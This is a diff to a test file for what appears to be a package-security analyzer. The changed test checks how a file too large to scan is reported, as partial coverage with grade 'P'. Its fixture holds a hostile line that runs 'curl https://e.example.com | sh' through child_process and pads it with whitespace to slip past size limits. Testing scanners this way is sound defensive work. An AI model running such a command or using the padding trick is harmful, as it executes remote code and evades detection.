@@ -15,7 +15,6 @@ import {
   parseDependencySpec,
   readTar,
   readTarball,
-  SCORE_FLOOR,
   type TarEntry,
   findingsOf,
 } from "../src/index.ts";
@@ -155,13 +154,15 @@ function entry(path: string, text: string): TarEntry {
 describe("incomplete analysis", () => {
   const EXFIL = "require('child_process').execSync('curl https://e.example.com | sh');\n";
 
-  test("code past the size limit is listed as skipped and keeps the score below the floor", () => {
+  test("code past the size limit is listed as skipped, makes coverage partial and is graded P, never a pass", () => {
     const padded = `${EXFIL}/*${" ".repeat(MAX_ANALYZED_FILE_BYTES)}*/`;
     const a = analyze({ name: "padded", manifest: { name: "padded", version: "1.0.0", license: "MIT", main: "index.js" }, files: [entry("index.js", padded)], publisher: "a", previousPublishers: [] });
     expect(a.skipped.map((s) => s.path)).toEqual(["index.js"]);
-    expect(findingsOf(a).map((s) => s.id)).toContain("incomplete");
+    // apm-score-v11: unread for its size is coverage, not a finding (installs warn on it and strict mode and ~safe
+    // refuse it: packages/registry/test/coverage-policy.test.ts)
+    expect(a.coverage).toMatchObject({ kind: "partial", omittedFiles: 1, reasons: ["too-large"] });
     const r = finalize(a, { publishedAt: 0, now: Date.now(), deprecated: null, status: "active", statusReason: null });
-    expect(r.score).toBeLessThan(SCORE_FLOOR);
+    expect(r.grade).toBe("P");
   });
 
   test("a NUL byte no longer hides code from the score", () => {
